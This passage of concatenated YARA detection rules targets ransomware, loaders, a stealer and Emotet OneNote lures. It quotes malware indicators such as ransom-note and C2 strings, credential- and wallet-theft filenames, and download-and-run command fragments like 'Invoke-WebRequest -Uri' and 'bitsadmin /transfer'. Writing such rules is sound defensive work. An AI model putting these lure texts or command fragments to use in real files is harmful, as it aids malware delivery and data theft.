		$typ1 = "itssoeasy" nocase
		$typ1_wide = "itssoeasy" nocase wide
		$typ2 = "itssoeasy" base64
		$typ3 = "ItsSoEasy" base64

		// C2 communication message strings
		// well this sucks, ha!
		$c2m1 = "d2VsbCB0aGlzIHN1Y2tzLCBoYSE="  
		// has this idiot payed the ransom?               
		$c2m2 = "aGFzIHRoaXMgaWRpb3QgcGF5ZWQgdGhlIHJhbnNvbT8="
		// oh, you're good!
		$c2m3 = "b2gsIHlvdSdyZSBnb29kIQ=="          
		// money, money, money!           
		$c2m4 = "bW9uZXksIG1vbmV5LCBtb25leSE="        
		// i need this to fuck you up!         
		$c2m5 = "aSBuZWVkIHRoaXMgdG8gZnVjayB5b3UgdXAh"   
		// --KEY-PROCEDURE--      
		$c2m6 = "LS1LRVktUFJPQ0VEVVJFLS0="                     
		
		// Base64 encoded message strings
		// Decrypt files now?
		$tkmsgMsg = "RGVjcnlwdCBmaWxlcyBub3c/"
		// Whoops your personal data was encrypted! Read the index.html on the Desktop how to decrypt it
		$tkmsg1Msg = "V2hvb3BzIHlvdXIgcGVyc29uYWwgZGF0YSB3YXMgZW5jcnlwdGVkISBSZWFkIHRoZSBpbmRleC5odG1sIG9uIHRoZSBEZXNrdG9wIGhvdyB0byBkZWNyeXB0IGl0"
		// Now your data is lost
		$tkmsg2Msg = "Tm93IHlvdXIgZGF0YSBpcyBsb3N0" 
		// It was as easy as I said, ha?
		$tkmsg3Msg = "SXQgd2FzIGFzIGVhc3kgYXMgSSBzYWlkLCBoYT8=" 

		// file names and typical ransom filetype
		$fileFiles = "L2lmX3lvdV9jaGFuZ2VfdGhpc19maWxlX3lvdXJfZGF0YV9pc19sb3N0" // /if_you_change_this_file_your_data_is_lost
		// /identifier
		$fileident = "L2lkZW50aWZpZXI=" 
		// .itssoeasy                                        
		$filetype = "Lml0c3NvZWFzeQ==" 
		$fileransom = "itssoeasy.html"

		// CMD print messages
		$cmd1 = "Welcome to the Google connector!\nPlease wait while the installer runs..."
		$cmd2 = "Do not destroy the current process, otherwise your data will be irreversibly encrypted."
		$cmd3 = "Please use the instructions in the .html file on your Desktop or your Home-Directory to decrypt your data"
		$cmd4 = "If you payed, this window will automatically check and decrypt your data."
		$cmd5 = "Wow! You're good. Now i will recover your files!\n => Do not kill this process, otherwise your data is lost!"
		$cmd6 = "Your files has been decrypted!\nThank you and Goodbye."

    condition:
        any of ($typ*) and all of ($c2*, $tkmsg*, $file*, $cmd*)
}
rule ItsSoEasy_Ransomware_basic {
    meta:
        description = "Detect basics of ItsSoEasy Ransomware (Itssoeasy-A)"
        author = "bstnbuck"
        date = "2023-11-02"
        yarahub_author_twitter = "@bstnbuck"
        yarahub_reference_link = "https://github.com/bstnbuck/ItsSoEasy"
        yarahub_uuid = "a2564e9f-e5f9-459c-ae4b-7656fa9df9c3"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "1ce280542553dc383b768b9189808e27"
        
    strings:
        $typ1 = "itssoeasy" nocase
        $typ1_wide = "itssoeasy" nocase wide
        $typ2 = "itssoeasy" base64
        $typ3 = "ItsSoEasy" base64
	
    condition:
        any of them
}rule ItsSoEasy_Ransomware_C_Var {
    meta:
		description = "Detect ItsSoEasy Ransomware (Itssoeasy-A C.Var)"
		author = "bstnbuck"
		date = "2023-11-02"
        yarahub_author_twitter = "@bstnbuck"
        yarahub_reference_link = "https://github.com/bstnbuck/ItsSoEasy"
        yarahub_uuid = "ad8b93fa-22bc-4c2a-b15f-35462f85d944"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "1ce280542553dc383b768b9189808e27"
    
	strings:
		$typ1 = "itssoeasy" nocase
		$typ1_wide = "itssoeasy" nocase wide
		$typ2 = "itssoeasy" base64
		$typ3 = "ItsSoEasy" base64

		// C2 communication message strings
		// well this sucks, ha!
		$c2m1 = "d2VsbCB0aGlzIHN1Y2tzLCBoYSE="  
		// has this idiot payed the ransom?               
		$c2m2 = "aGFzIHRoaXMgaWRpb3QgcGF5ZWQgdGhlIHJhbnNvbT8="
		// oh, you're good!
		$c2m3 = "b2gsIHlvdSdyZSBnb29kIQ=="          
		// money, money, money!           
		$c2m4 = "bW9uZXksIG1vbmV5LCBtb25leSE="        
		// i need this to fuck you up!         
		$c2m5 = "aSBuZWVkIHRoaXMgdG8gZnVjayB5b3UgdXAh"   
		// --KEY-PROCEDURE--      
		$c2m6 = "LS1LRVktUFJPQ0VEVVJFLS0="                     
		
		// Base64 encoded message strings
		// Decrypt files now?
		$tkmsgMsg = "RGVjcnlwdCBmaWxlcyBub3c/"
		// Whoops your personal data was encrypted! Read the index.html on the Desktop how to decrypt it
		$tkmsg1Msg = "V2hvb3BzIHlvdXIgcGVyc29uYWwgZGF0YSB3YXMgZW5jcnlwdGVkISBSZWFkIHRoZSBpbmRleC5odG1sIG9uIHRoZSBEZXNrdG9wIGhvdyB0byBkZWNyeXB0IGl0"
		// Now your data is lost
		$tkmsg2Msg = "Tm93IHlvdXIgZGF0YSBpcyBsb3N0" 
		// It was as easy as I said, ha?
		$tkmsg3Msg = "SXQgd2FzIGFzIGVhc3kgYXMgSSBzYWlkLCBoYT8=" 

		// file names and typical ransom filetype
		$fileFiles = "L2lmX3lvdV9jaGFuZ2VfdGhpc19maWxlX3lvdXJfZGF0YV9pc19sb3N0" // /if_you_change_this_file_your_data_is_lost
		// /identifier
		$fileident = "L2lkZW50aWZpZXI=" 
		// .itssoeasy                                        
		$filetype = "Lml0c3NvZWFzeQ==" 
		$fileransom = "itssoeasy.html"

		// CMD print messages
		$cmd1 = "Welcome to the Google connector!\nPlease wait while the installer runs..."
		$cmd2 = "Do not destroy the current process, otherwise your data will be irreversibly encrypted."
		$cmd3 = "Please use the instructions in the .html file on your Desktop or your Home-Directory to decrypt your data"
		$cmd4 = "If you payed, this window will automatically check and decrypt your data."
		$cmd5 = "Wow! You're good. Now i will recover your files!\n => Do not kill this process, otherwise your data is lost!"
		$cmd6 = "Your files has been decrypted!\nThank you and Goodbye."

    condition:
        any of ($typ*) and all of ($c2*, $tkmsg*, $file*, $cmd*) and (filesize < 100KB or (filesize > 1MB and filesize < 3MB))
}rule ItsSoEasy_Ransomware_Go_Var {
    meta:
		description = "Detect ItsSoEasy Ransomware (Itssoeasy-A Go.Var)"
		author = "bstnbuck"
		date = "2023-11-02"
        yarahub_author_twitter = "@bstnbuck"
        yarahub_reference_link = "https://github.com/bstnbuck/ItsSoEasy"
        yarahub_uuid = "e1115417-d183-472e-8156-6e3f070ef2e6"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "b4b6c316ba4285d42649026d38f9ea43"
    
	strings:
		$typ1 = "itssoeasy" nocase
		$typ1_wide = "itssoeasy" nocase wide
		$typ2 = "itssoeasy" base64
		$typ3 = "ItsSoEasy" base64

		// C2 communication message strings
		// well this sucks, ha!
		$c2m1 = "d2VsbCB0aGlzIHN1Y2tzLCBoYSE="  
		// has this idiot payed the ransom?               
		$c2m2 = "aGFzIHRoaXMgaWRpb3QgcGF5ZWQgdGhlIHJhbnNvbT8="
		// oh, you're good!
		$c2m3 = "b2gsIHlvdSdyZSBnb29kIQ=="          
		// money, money, money!           
		$c2m4 = "bW9uZXksIG1vbmV5LCBtb25leSE="        
		// i need this to fuck you up!         
		$c2m5 = "aSBuZWVkIHRoaXMgdG8gZnVjayB5b3UgdXAh"   
		// --KEY-PROCEDURE--      
		$c2m6 = "LS1LRVktUFJPQ0VEVVJFLS0="                     
		
		// Base64 encoded message strings
		// Decrypt files now?
		$tkmsgMsg = "RGVjcnlwdCBmaWxlcyBub3c/"
		// Whoops your personal data was encrypted! Read the index.html on the Desktop how to decrypt it
		$tkmsg1Msg = "V2hvb3BzIHlvdXIgcGVyc29uYWwgZGF0YSB3YXMgZW5jcnlwdGVkISBSZWFkIHRoZSBpbmRleC5odG1sIG9uIHRoZSBEZXNrdG9wIGhvdyB0byBkZWNyeXB0IGl0"
		// Now your data is lost
		$tkmsg2Msg = "Tm93IHlvdXIgZGF0YSBpcyBsb3N0" 
		// It was as easy as I said, ha?
		$tkmsg3Msg = "SXQgd2FzIGFzIGVhc3kgYXMgSSBzYWlkLCBoYT8=" 

		// file names and typical ransom filetype
		$fileFiles = "L2lmX3lvdV9jaGFuZ2VfdGhpc19maWxlX3lvdXJfZGF0YV9pc19sb3N0" // /if_you_change_this_file_your_data_is_lost
		// /identifier
		$fileident = "L2lkZW50aWZpZXI=" 
		// .itssoeasy                                        
		$filetype = "Lml0c3NvZWFzeQ==" 
		$fileransom = "itssoeasy.html"

		// CMD print messages
		$cmd1 = "Welcome to the Google connector!\nPlease wait while the installer runs..."
		$cmd2 = "Do not destroy the current process, otherwise your data will be irreversibly encrypted."
		$cmd3 = "Please use the instructions in the .html file on your Desktop or your Home-Directory to decrypt your data"
		$cmd4 = "If you payed, this window will automatically check and decrypt your data."
		$cmd5 = "Wow! You're good. Now i will recover your files!\n => Do not kill this process, otherwise your data is lost!"
		$cmd6 = "Your files has been decrypted!\nThank you and Goodbye."

    condition:
        any of ($typ*) and all of ($c2*, $tkmsg*, $file*, $cmd*) and (filesize > 2500KB and filesize < 6MB)
}import "pe"


rule ItsSoEasy_Ransomware_Py_Var {
    meta:
		description = "Detect ItsSoEasy Ransomware (Itssoeasy-A Py.Var)"
		author = "bstnbuck"
		date = "2023-11-02"
        yarahub_author_twitter = "@bstnbuck"
        yarahub_reference_link = "https://github.com/bstnbuck/ItsSoEasy"
        yarahub_uuid = "d4a753c7-fd2d-482c-8e4f-bba0766a9e07"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "71a3802f52847e83d3bacd011451b595"
    
	strings:
		$typ1 = "itssoeasy" nocase
		$typ1_wide = "itssoeasy" nocase wide
		$typ2 = "itssoeasy" base64
		$typ3 = "ItsSoEasy" base64

		// other strings
		$a1 = "pyi-windows-manifest-filename"
		$a2 = "_PYI_PROCNAME"	

    condition:
        any of ($typ*) and (($a1 and pe.number_of_resources > 0) or $a2) and filesize > 8MB and filesize < 16MB
}


rule koi_loader {
    meta:
        author = "@luc4m"
        date = "2023-03-26"
        link = "https://medium.com/@lcam/updates-from-the-maas-new-threats-delivered-through-nullmixer-d45defc260d1"
        hash_md5 = "9725ec075e92e25ea5b6e99c35c7aa74"
        tlp = "WHITE"
	yarahub_uuid = "d0872aaf-306d-4068-b246-86d12a6e56f7"
        yarahub_license =  "CC0 1.0"
        yarahub_rule_matching_tlp =  "TLP:WHITE"
        yarahub_rule_sharing_tlp =  "TLP:WHITE"
        yarahub_reference_md5= "9725ec075e92e25ea5b6e99c35c7aa74" 
    strings:

 $tm_0 = /debug[0-9]{1,3}\.ps1/i wide
 $tm_1 = "First stage size: {0}" wide
 $tm_2 = "Second stage size: {0}" wide
 $tm_3 = "Telegram Desktop\\tdata" wide
 $tm_4 = "Executed " wide
 $tm_5 = " or downloading " wide
 $tm_6 = "LDR" wide

 $curve_0 = "key must be 32 bytes long (but was {0} bytes long)" wide
 $curve_1 = "rawKey must be 32 bytes long (but was {0} bytes long)" wide
 $curve_2 = "rawKey" wide 
 $curve_3 = "key" wide 

    condition:
         (5 of ($tm_*)) and (1 of ($curve_*))
}

rule LATAMHotel_Obfuscated_BAT {

  meta:
      author = "Ankit Anubhav - ankitanubhav.info"
      description = "Detects a campaign targeted towards LatinAmerican Hotels,generally leading to AsyncRAT"
      date = "2022-07-23"
      yarahub_author_twitter = "@ankit_anubhav"
      yarahub_author_email = "ankit.yara@inbox.ru"
      yarahub_reference_link = "https://threatresearch.ext.hp.com/stealthy-opendocument-malware-targets-latin-american-hotels/"
      yarahub_reference_md5 = "00e59c5ea76face15c42450c71676e03"
      yarahub_uuid = "a31088bd-4baf-4f99-a89a-08f03389110b"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      malpedia_family = "win.asyncrat"

strings:


	$x = "1%%"
	$y = /~[0-9]{1,2}/
	$z = /=[A-Za-z0-9]{62}/

condition:
	#x > 90 and #y > 90 and $z  and filesize <30000


}


rule lnk_from_chinese : odd {
    meta:
        category = "apt"
        description = "what the rule does"
        author = "malcat"
        reliability = 50
        date = "2022-07-04"
        yarahub_uuid = "17a4f2d6-0792-45de-8b90-749bec1bcc18"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "e3f89049dc5f0065ee4d780f8aef9c04"
    strings:
        $magic = { 4C0000000114020000000000C000000000000046 }
        $serial = {90962EBA}
    condition:
        $magic at 0 and $serial
}
rule loader_win_bumblebee {
   meta:
      author = "SEKOIA.IO"
      description = "Find BumbleBee samples based on specific strings"
      date = "2022-06-02"
      yarahub_author_twitter = "@sekoia_io"
      yarahub_reference_link = "https://blog.sekoia.io/bumblebee-a-new-trendy-loader-for-initial-access-brokers/"
      yarahub_reference_md5 = "6d58437232ebab24d810270096e6e20b"
      yarahub_uuid = "8fd795c7-6896-498c-a892-de9da6427b60"
      yarahub_license = "CC BY 4.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      malpedia_family = "win.bumblebee"

   strings:
      $str0 = { 5a 00 3a 00 5c 00 68 00 6f 00 6f 00 6b 00 65 00 72 00 32 00 5c 00 43 00 6f 00 6d 00 6d 00 6f 00 6e 00 5c 00 6d 00 64 00 35 00 2e 00 63 00 70 00 70 00 } // Z:\hooker2\Common\md5.cpp
      $str1 = "/gates" ascii
      $str2 = "3C29FEA2-6FE8-4BF9-B98A-0E3442115F67" wide

   condition:
      uint16be(0) == 0x4d5a and all of them
}
rule LockBit3_ransomware {
    meta: 
        author = "BlackBerry"
        date = "2022-08-03"
        version = "1"
        TLP = "clear"
        description = "Rule detecting Lockbit3 ransomware samples"
	yarahub_reference_md5 = "44e8c23bfb649ecf4cb753ec332899dd"
	yarahub_uuid = "fa7215eb-3fc5-4b15-b44d-2b182d7c5e66"
	yarahub_license = "CC BY 4.0"
	yarahub_rule_matching_tlp = "TLP:WHITE"
	yarahub_rule_sharing_tlp = "TLP:WHITE"
    strings: 
        $code1 = {004E01536574506978656C0000590153657454657874436F6C6F7200006B01546578744F757457000067646933322E646C6C0063004372656174654469616C6F67506172616D570000}
        $code2 = {7D0C66AD6685C07505E98A0000006683F841720C6683F84677066683E837EB266683F861720C6683F86677066683E857EB146683F830720C6683F83977066683E830EB02EBBC0FB6C8C1E10466AD6685C07502EB436683F841720C6683F84677066683E837EB296683F861720C6683F86677066683E857EB176683F830720C6683F83977066683E830EB05E972FFFFFF32C1AAE96AFFFF}
        $code3 = {FFFF8BC885C974348BF78BD166B82000F266AF85C975128BCA894DFC8B7D0CF366A56633C066ABEB132BD14A87D1894DFC8B7D0CF366A56633C066AB8B45FC5F5E5A8BE55DC2080090558BEC81EC840000}
    condition:
        uint16(0) == 0x5a4d and
        filesize < 3MB and
        2 of them
}import "pe"

rule LockbitBlack_Loader {
    meta:
        date = "2022-07-03"
        description = "Hunting rule for the Lockbit Black loader, based on https://twitter.com/vxunderground/status/1543661557883740161"
        author = "Zander Work"
        yarahub_author_twitter = "@captainGeech42"
        yarahub_uuid = "e4800674-46f7-4ba9-9d00-b9f2a5f51371"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "38745539b71cf201bb502437f891d799"
    strings:
        $c1 = { 02 f1 2a f1 8b c8 d3 ca 03 d0 }
        $c2 = { 8a 54 ?? 00 02 d3 8a 5c ?? 00 8a 54 ?? 00 8a 54 ?? 00 fe c2 8a 44 ?? 00 30 07 }
        $c3 = { 8b d8 8b 5b 08 8b 73 3c 03 f3 0f b7 7e 06 8d b6 f8 00 00 00 }
        $hash1 = { 3d 75 ba 0e 64 }
        $hash2 = { 3d 75 80 91 76 }
        $hash3 = { 3d 1b a4 04 00 }
        $hash4 = { 3d 9b b4 84 0b }
    condition:
        pe.is_pe and
        filesize > 100KB and filesize < 200KB and
        5 of them and
        pe.section_index(".itext") >= 0 and
        pe.section_index(".pdata") >= 0
}rule lockbitblack_ransomnote {
    meta:
        date = "2022-07-02"
        description = "Hunting rule for LockBit Black/3.0 ransom notes"
        yarahub_author_twitter = "@captainGeech42"
        yarahub_uuid = "cc2308df-9b42-4169-8146-c63b0bc6b1f7"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "954d81de1c53158b0050b38d4f4b4801"
    strings:
        $s1 = "~~~ LockBit 3.0" ascii wide
        $s2 = "the world's fastest and most stable" ascii wide
        $s3 = "http://lockbitapt" ascii wide
        $s4 = ">>>>> Your data is stolen and encrypted" ascii wide
    condition:
        filesize < 20KB and 2 of them and #s3 > 10
}rule LucaStealer {


   meta:
 
        author = "Chat3ux" 
        date = "2022-09-08" 
        yarahub_reference_md5 = "c73c38662b7283befc65c87a2d82ac94" 
        yarahub_uuid = "71c9c97e-161a-41c8-8014-4ee186c92a22" 
        yarahub_license = "CC0 1.0" 
        yarahub_author_twitter = "@Chat3ux_" 
        yarahub_rule_matching_tlp = "TLP:WHITE" 
        yarahub_rule_sharing_tlp = "TLP:WHITE"  
        description = "Lucasstealer"

   strings:

      $s1 = "passwords.txt" ascii wide
      $s2 = "cookies" ascii wide
      $s3 = "telegram" ascii wide
      $s4 = "sensfiles.zip" ascii wide
      $s5 = "screen-.png" ascii wide
      $s6 = "system_info.txt" ascii wide
      $s7 = "out.zip" ascii wide
      $s8 = "info.txt" ascii wide
      $s9 = "system_info.txt"
      $s11 = "dimp.sts"
      $s12 = "Credit Cards:"
      $s13 = "Wallets:"

   condition:
   ( 6 of ($s*) )
}rule MALWARE_APT29_SVG_Delivery_Jul23
{
    meta:
        author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
        description = "Detects Javascript code in crafted SVG files delivering malware"
        reference = "https://twitter.com/StopMalvertisin/status/1677192618118369280"
        date = "2023-07-07"
        tlp = "CLEAR"
        hash = "4875a9c4af3044db281c5dc02e5386c77f331e3b92e5ae79ff9961d8cd1f7c4f"
        yarahub_uuid = "f4f38e82-5252-44dc-b020-a317bb3daf84"
        yarahub_reference_md5 = "295527e2e38da97167979ade004de880"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_author_twitter = "@SI_FalconTeam"

    strings:
        $xml_tag = {3c 3f 78 6d 6c}
        $svg_tag = {3c 73 76 67}

        $js_tag = "<script"
        $js_mimeJS = "text/javascript"
        $js_mimeOS = "application/octet-stream"
        $js_create = "URL.createObjectURL("
        $js_window = "window.location.assign("
        $js_revoke = "URL.revokeObjectURL("
        $js_file = "new File("
        $js_remote = "window.location.href("

        $atom_mime = "application/atom+xml"

    condition:
        $xml_tag at 0x0
        and $svg_tag
        and not $atom_mime
        and filesize > 500KB
        and 4 of ($js_*)
}





rule malware_bumblebee_packed { 
    meta: 
        author = "Marc Salinas @ CheckPoint Research" 
        malware_family = "BumbleBee" 
        yarahub_reference_md5 = "e2e58c6b4fc6aa36eb5f6b5e6b8743ff"
        yarahub_uuid = "5f1f0757-0b17-4cbc-ab0d-b8a7f6bd9cbd"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        date = "2022-07-13" 
        description = "Detects the packer used by bumblebee, the rule is based on the code responsible for allocating memory for a critical structure in its logic." 
  
        dll_jul = "6bc2ab410376c1587717b2293f2f3ce47cb341f4c527a729da28ce00adaaa8db" 
        dll_jun = "82aab01a3776e83695437f63dacda88a7e382af65af4af1306b5dbddbf34f9eb" 
        dll_may = "a5bcb48c0d29fbe956236107b074e66ffc61900bc5abfb127087bb1f4928615c" 
        iso_jul = "ca9da17b4b24bb5b24cc4274cc7040525092dffdaa5922f4a381e5e21ebf33aa" 
        iso_jun = "13c573cad2740d61e676440657b09033a5bec1e96aa1f404eed62ba819858d78" 
        iso_may = "b2c28cdc4468f65e6fe2f5ef3691fa682057ed51c4347ad6b9672a9e19b5565e" 
        zip_jun = "7024ec02c9670d02462764dcf99b9a66b29907eae5462edb7ae974fe2efeebad" 
        zip_may = "68ac44d1a9d77c25a97d2c443435459d757136f0d447bfe79027f7ef23a89fce" 
  
    strings: 
        $heapalloc = {  
            48 8? EC [1-6]           // sub     rsp, 80h 
            FF 15 ?? ?? 0? 00 [0-5]  // call    cs:GetProcessHeap 
            33 D2                    // xor     edx, edx        ; dwFlags 
            4? [2-5]                 // mov     rcx, rax        ; hHeap 
            4? ?? ??                 // mov     r8d, ebx        ; dwBytes 
            FF 15 ?? ?? 0? 00        // call    cs:HeapAlloc 
            [8 - 11]                 // (load params) 
            48 89 05 ?? ?? ?? 00     // mov     cs:HeapBufferPtr, rax 
            E8 ?? ?? ?? ??           // call    memset 
            4? 8B ?? ?? ?? ?? 00     // mov     r14, cs:HeapBufferPtr 
        }  
  
    condition: 
        $heapalloc 
}rule MALWARE_Emotet_OneNote_Delivery_js_Mar23
{
	meta:
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		description = "Detects Microsoft OneNote files used to deliver Emotet (.js Payload)"
		reference = "https://twitter.com/bomccss/status/1636746149855121411"
		date = "2023-03-17"
		tlp = "CLEAR"
		hash = "a43e0864905fe7afd6d8dbf26bd27d898a2effd386e81cfbc08cae9cf94ed968"
		yarahub_reference_md5 = "b951629aedffbabc180ee80f9725f024"
		yarahub_uuid = "eea31d8d-30cb-4210-a054-aa77ad18fd00"
		yarahub_license = "CC BY 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_author_twitter = "@SI_FalconTeam"

	strings:
		// Lure specific strings
		$s_headline= "Connect to the cloud" wide
		$s_attachment = "This document contains attachments from the cloud" wide
		$s_receive = "to receive them, double click \"Next\"" wide
		$s_imgFileName = "NOTE4_WHITE_1.bmp" wide
		$s_path = "C:\\Autoruns\\" wide
		$s_output = "output1.js"

		// Javascript keywords
		$js1 = "function" ascii
		$js2 = ".replace(\"" ascii

		// Lure contains 3 PNGs and the Javascript code
		$GUID = {E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC}

	condition:
		uint32be(0x0) == 0xE4525C7B
		and 3 of ($s_*)
		and any of ($js*)
		and #GUID == 4
}rule MALWARE_Emotet_OneNote_Delivery_vbs_Mar23
{
	meta:
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		description = "Detects Microsoft OneNote files used to deliver Emotet (VBScript Payload)"
		reference = "https://www.secuinfra.com/en/news/the-whale-surfaces-again-emotet-epoch4-spam-botnet-returns/"
		date = "2023-03-22"
		version = "1.1"
		tlp = "CLEAR"
		hash0 = "dd9fcdcaf5c26fc27863c86aa65948924f23ab9faa261562cbc9d65ac80d33d4"
		hash1 = "ca2234b9c6f7c453b91a1ca10fc7b05487f94850be7ac5ea42986347d93772d8"
		hash2 = "b75681c1f99c4caf541478cc417ee9e8fba48f9b902c45d8bda0158a61ba1a2f"
		hash3 = "7c4591fd03b73ba6d0ec71a3cf89a04bfb4bd240d359117d96834a83727bdcc2"
		hash4 = "8fd4f59a30ef77ddf94cfb61d50212c8604316634c26e2bd0849494cba8da1af"
		yarahub_reference_md5 = "9933577fa741233071f0714d7fbffbff"
		yarahub_uuid = "c38da3bc-37bb-4c77-8d7b-392566d3d310"
		yarahub_license = "CC BY 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_author_twitter = "@SI_FalconTeam"

	strings:
		$s_protected = "This document is protected" wide
		$s_click = "You have to double-click \"View\" button to open" wide
		$s_press = "press to unblock document" wide
		$s_imgFileName = "Untitled picture.jpg" wide
		$s_id = "W5M0MpCehiHzreSzNTczkc9d" ascii
		
		$radTmp = /rad.{5}\.tmp/ 

		$ext0 = ".vbs" ascii wide
		$ext1 = ".vbe" ascii wide
		$ext2 = ".wsf" ascii wide
		$ext3 = ".wsc" ascii wide
		$ext4 = ".htm" ascii wide
		$ext5 = ".hta" ascii wide

		// based on @DhaeyerWolf's rule: https://yaraify.abuse.ch/yarahub/rule/OneNote_EmbeddedFiles_NoPictures/
		$GUID = {E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC}
		$PNG = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 89 50 4E 47 0D 0A 1A 0A }
		$JPG = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 FF D8 FF }

	condition:
		uint32be(0x0) == 0xE4525C7B
		and any of ($s_*)
		and $radTmp
		and any of ($ext*)
		and (#GUID > #PNG + #JPG)
}rule MALWARE_Emotet_OneNote_Delivery_wsf_Mar23
{
	meta:
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		description = "Detects Microsoft OneNote files used to deliver Emotet (.wsf Payload)"
		reference = "https://www.secuinfra.com/en/news/the-whale-surfaces-again-emotet-epoch4-spam-botnet-returns/"
		date = "2023-03-16"
		tlp = "CLEAR"
		hash0 = "dd9fcdcaf5c26fc27863c86aa65948924f23ab9faa261562cbc9d65ac80d33d4"
		hash1 = "ca2234b9c6f7c453b91a1ca10fc7b05487f94850be7ac5ea42986347d93772d8"
		hash2 = "b75681c1f99c4caf541478cc417ee9e8fba48f9b902c45d8bda0158a61ba1a2f"
		hash3 = "7c4591fd03b73ba6d0ec71a3cf89a04bfb4bd240d359117d96834a83727bdcc2"
		yarahub_reference_md5 = "f2fb54c7c909191ae10e34e50766a118"
		yarahub_uuid = "9e69e45b-f0b0-423f-ad66-9900851e662f"
		yarahub_license = "CC BY 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_author_twitter = "@SI_FalconTeam"

	strings:

		$s_protected = "This document is protected" wide
		$s_click = "You have to double-click \"View\" button to open" wide
		$s_imgFileName = "Untitled picture.jpg" wide

		$script = "language=\"VBScript\""
		$wsfExt = ".wsf" ascii wide

		$GUIDwsf = {E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 3C 6A 6F 62 20 69 64 3D 22}
		$endTmp = /rad.{5}\.tmp/ 

	condition:
		uint32be(0x0) == 0xE4525C7B
		and any of ($s_*)
		and $script
		and $wsfExt
		and $GUIDwsf
		and $endTmp
}rule MALWARE_OneNote_Delivery_Jan23
{
	meta:
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		description = "Detects suspicious Microsoft OneNote files used to deliver Malware"
		reference = "https://twitter.com/James_inthe_box/status/1615421130877329409"
		date = "2023-01-19"
		tlp = "CLEAR"
		hash0 = "18af397a27e58afb901c92f37569d48e3372cf073915723e4e73d44537bcf54d"
		hash1 = "de30f2ba2d8916db5ce398ed580714e2a8e75376f31dc346b0e3c898ee0ae4cf"
		hash2 = "bfc979c0146d792283f825f99772370f6ff294dfb5b1e056943696aee9bc9f7b"
		hash3 = "e0d9f2a72d64108a93e0cfd8066c04ed8eabe2ed43b80b3f589b9b21e7f9a488"
		hash4 = "3f00a56cbf9a0e59309f395a6a0b3457c7675a657b3e091d1a9440bd17963f59"
		yarahub_reference_md5 = "65b3b312dfaf25a72e9171271909357e"
		yarahub_uuid = "1b3f4b6b-9dd4-4080-af23-195078bf3abe"
		yarahub_license = "CC BY 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_author_twitter = "@SI_FalconTeam"

	strings:
		// HTA
		$hta = "hta:application" nocase
		$script1 = "type=\"text/vbscript\""
		$script2 = "language=\"VBScript\""
		
		// Powershell
		$powershell = "powershell" nocase
		$startProc = "Start-Process -Filepath"
		$webReq = "Invoke-WebRequest -Uri"
		$bitsadmin = "bitsadmin /transfer"
		
		//WScript
		$wscript = "WScript.Shell" nocase
		$autoOpen = "Sub AutoOpen()"
		$root = "GetObject(\"winmgmts:\\.\\root\\cimv2\")"
		$wsfExt = ".wsf" ascii wide
		$vbsExt = ".vbs" ascii wide

		// Batch
		$cmd = "cmd /c" nocase
		$batch = "@echo off"
		$batExt = ".bat" ascii wide
		$delExit = "(goto) 2>nul & del \"%~f0\"..exit /b"

		// PE Files
		$dosString = "!This program cannot be run in DOS mode"
		$exeExt = ".exe" ascii wide
		
		// Image Lure
		$imageFile = "button_click-to-view-document.png" wide
		$click = "click to view document" nocase wide
		
		// Leaked File Paths
		$path1 = "C:\\Users\\My\\OneDrive\\Desktop" wide
		$path2 = "C:\\Users\\Administrator\\Documents\\Dove" wide
		$path3 = "C:\\Users\\julien.galleron\\Downloads" wide
	
	condition:
